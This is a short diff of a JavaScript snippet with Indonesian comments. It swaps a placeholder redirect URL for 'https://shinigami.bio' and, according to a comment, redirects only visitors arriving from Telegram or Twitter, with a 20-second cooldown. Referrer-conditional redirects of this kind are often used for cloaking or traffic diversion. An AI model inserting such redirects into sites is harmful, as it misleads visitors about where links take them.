@@ -1,7 +1,7 @@
 (function () {
   try {
     // === SETTING ===
-    var target = "https://contoh.domainmu.com/path"; // <-- GANTI ke URL tujuan kamu (HTTPS)
+    var target = "https://shinigami.bio"; // <-- GANTI ke URL tujuan kamu (HTTPS)
     var cooldownMs = 20 * 1000;                      // 20 detik
 
     // Hanya redirect jika sumbernya Telegram atau Twitter
